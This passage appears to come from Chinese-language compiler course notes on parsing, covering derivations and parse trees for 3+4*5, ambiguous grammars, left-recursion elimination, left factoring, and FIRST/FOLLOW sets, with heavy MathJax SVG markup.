<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  推导3+4*5这个句子</span><br><span class="line">  </span><br><span class="line">  - 最左推导1：</span><br><span class="line">  </span><br><span class="line">    E-&gt;E+E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+E*E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+4*E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+4*5</span><br><span class="line">  </span><br><span class="line">    ![分析树1](https://gitee.com/kingwempity/images/raw/master/images/分析树1.png)</span><br><span class="line">  </span><br><span class="line">  - 最左推导2：</span><br><span class="line">  </span><br><span class="line">    E-&gt;E*E</span><br><span class="line">  </span><br><span class="line">     -&gt;E+E*E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+E*E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+4*E</span><br><span class="line">  </span><br><span class="line">     -&gt;3+4*5</span><br><span class="line">  </span><br><span class="line">    ![分析树2](https://gitee.com/kingwempity/images/raw/master/images/分析树2.png)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">### **二义性文法：**</span><br><span class="line"></span><br><span class="line">- 给定文法G，如果存在句子S，它有两棵不同的分析树，那么称G是二义性文法</span><br><span class="line"></span><br><span class="line">- 解决方案：文法重写</span><br><span class="line"></span><br><span class="line">  - ```文法重写</span><br><span class="line">    E-&gt;E+T | T</span><br><span class="line">    T-&gt;T*F | F</span><br><span class="line">    F-&gt;num | id</span><br><span class="line">    </span><br></pre></td></tr></table></figure></div>
  
  
  
- E-&gt;E+T 

  -&gt;T+T

  -&gt;F+T

  -&gt;3+T

  -&gt;3+T*F

  -&gt;3+F*F

  -&gt;3+4*F

  -&gt;3+4*5
</code></pre>
</li>
</ul>
<h3 id="消除左递归："><a href="#消除左递归：" class="headerlink" title="消除左递归："></a><strong>消除左递归：</strong></h3><p>一个文法式左递归的，如果它有非终结符A，对某个串ɑ，存在推导A==&gt;+Aɑ.自顶而下的分析方法不能用于左递归文法，因此需要消除左递归。由A-&gt;Aɑ的产生式引起的左递归称为直接左递归。</p>
<ul>
<li><p>方法</p>
<ul>
<li><p>A-&gt;Aɑ|β消除左递归</p>
<ul>
<li>A-&gt;βA’</li>
<li>A’-&gt;ɑA’| ɛ</li>
</ul>
</li>
<li><p>例如文法</p>
<p>S-&gt;Aa|b</p>
<p>A-&gt;Sd| ɛ中S=&gt;Aa=&gt;Sda，不是直接左递归，需要化成直接左递归，</p>
<ul>
<li>S-&gt;Aa|b</li>
<li>A-&gt;Aad|bd| ɛ</li>
</ul>
<p>最后消除左递归:</p>
<ul>
<li>S-&gt;Aa|b</li>
<li>A-&gt;bdA’| ɛA’</li>
<li>A’-&gt;adA’| ɛ</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="提左因子："><a href="#提左因子：" class="headerlink" title="提左因子："></a><strong>提左因子：</strong></h3><p>提左因子是一种文法变换</p>
<ul>
<li>方法<ul>
<li>A-&gt;αβ<del>1</del> | αβ<del>2</del>提取左因子<ul>
<li>A-&gt;αA’</li>
<li>A’-&gt;β<del>1</del> | β<del>2</del></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="FIRST集："><a href="#FIRST集：" class="headerlink" title="FIRST集："></a><strong>FIRST集：</strong></h3><ul>
<li>一个文法的符号串α的开始符号集合FIRST(α)：从非终结符N开始推导出的句子开头的所有可能终结符的集合,ɛ属于FIRST(α)</li>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="33.815ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 14946 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mi" transform="translate(749,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mi" transform="translate(1253,0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"/></g><g data-mml-node="mi" transform="translate(2012,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mi" transform="translate(2657,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g><g data-mml-node="mo" transform="translate(3361,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(3750,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"/></g><g data-mml-node="mo" transform="translate(4390,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(5056.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6112.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(529,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(807,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"/></g><g data-mml-node="msup" transform="translate(1724.8,0)"><g data-mml-node="mo"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"/></g><g data-mml-node="mo" transform="translate(1033,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mi" transform="translate(3439.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(4134.8,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"/></g><g data-mml-node="mo" transform="translate(5473.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(5918.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(6724.9,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"/></g><g data-mml-node="msub" transform="translate(7669.7,0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"/></g><g data-mml-node="mi" transform="translate(616,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g></g></g></g></g></svg></mjx-container></li>
<li>例：<ul>
<li>E-&gt;TE’</li>
<li>E’-&gt;+TE’|ɛ</li>
<li>T-&gt;FT’</li>
<li>T’-&gt;*FT’|ɛ</li>
<li>F-&gt;(E)|id<ul>
<li>FIRST(E)=FIRST(TE’)=FIRST(T)=FIRST(F)={(,id}</li>
<li>FIRST(E’)={+,ɛ}</li>
<li>FIRST(T’)={*,ɛ}</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="FOLLOW集："><a href="#FOLLOW集：" class="headerlink" title="FOLLOW集："></a><strong>FOLLOW集：</strong></h3><ul>
<li>非终结符A的后继符号集合FOLLOW(A)是所有句型中可以直接出现在A后面的终结符的集合，如果A是句型中最右边的非终结符，那么$属于FOLLOW(A)。</li>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="43.054ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 19029.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"/></g><g data-mml-node="mi" transform="translate(749,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/></g><g data-mml-node="mi" transform="translate(1512,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mi" transform="translate(2193,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mi" transform="translate(2874,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/></g><g data-mml-node="mi" transform="translate(3637,0)"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"/></g><g data-mml-node="mo" transform="translate(4685,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(5074,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"/></g><g data-mml-node="mo" transform="translate(5824,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(6490.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(7546.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(529,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(807,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g><g data-mml-node="mo" transform="translate(1729.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="msup" transform="translate(2507.8,0)"><g data-mml-node="mo"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"/></g><g data-mml-node="mo" transform="translate(811,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mo" transform="translate(4000.1,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"/></g><g data-mml-node="mi" transform="translate(5338.8,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"/></g><g data-mml-node="mi" transform="translate(6088.8,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(6784.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 